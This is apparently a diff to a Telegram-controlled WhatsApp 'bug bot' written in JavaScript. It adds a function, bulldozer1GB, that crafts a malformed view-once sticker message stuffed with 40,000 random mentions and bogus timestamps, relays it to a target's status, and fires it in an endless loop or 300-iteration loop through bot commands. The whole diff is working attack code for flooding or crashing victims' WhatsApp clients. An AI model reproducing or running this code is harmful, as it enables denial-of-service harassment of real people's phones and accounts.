@@ -2316,6 +2316,95 @@ async function delayByGizz(target) {
     }
   });
 }
+async function bulldozer1GB(target) {
+  let parse = true;
+  let SID = "5e03e0&mms3";
+  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
+  let type = "image/webp";
+  if (11 > 9) {
+    parse = parse ? false : true;
+  }
+
+  let message = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true",
+          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
+          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
+          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
+          mimetype: type,
+          directPath:
+            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
+          fileLength: {
+            low: Math.floor(Math.random() * 1000),
+            high: 0,
+            unsigned: true,
+          },
+          mediaKeyTimestamp: {
+            low: Math.floor(Math.random() * 1700000000),
+            high: 0,
+            unsigned: false,
+          },
+          firstFrameLength: 19904,
+          firstFrameSidecar: "KN4kQ5pyABRAgA==",
+          isAnimated: true,
+          contextInfo: {
+            participant: target,
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                {
+                  length: 1000 * 40,
+                },
+                () =>
+                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+              ),
+            ],
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
+          },
+          stickerSentTs: {
+            low: Math.floor(Math.random() * -20000000),
+            high: 555,
+            unsigned: parse,
+          },
+          isAvatar: parse,
+          isAiSticker: parse,
+          isLottie: parse,
+        },
+      },
+    },
+  };
+
+  const msg = generateWAMessageFromContent(target, message, {});
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+}
 async function delayMakerInvis(target) {
   return sock.relayMessage(
     target,
@@ -2867,7 +2956,7 @@ bot.onText(/\/ranzunli(?:\s(.+))?/, async (msg, match) => {
     });
 
     while (true) {
-        await locxd(formatedNumber);
+        await bulldozer1GB(formatedNumber);
         await new Promise((resolve) => setTimeout(resolve, 3000));
         console.log(chalk.red("Send Bug Succes"))
     }
@@ -2916,7 +3005,7 @@ bot.onText(/\/ranzbull(?:\s(.+))?/, async (msg, match) => {
 
     // Proses pengiriman bug
     for (let i = 0; i < 300; i++) { // Kirim 3 kali langsung
-        await bulldog(formatedNumber)
+        await delayMakerInvis(formatedNumber)
         await new Promise((resolve) => setTimeout(resolve, 2500));
     }
 
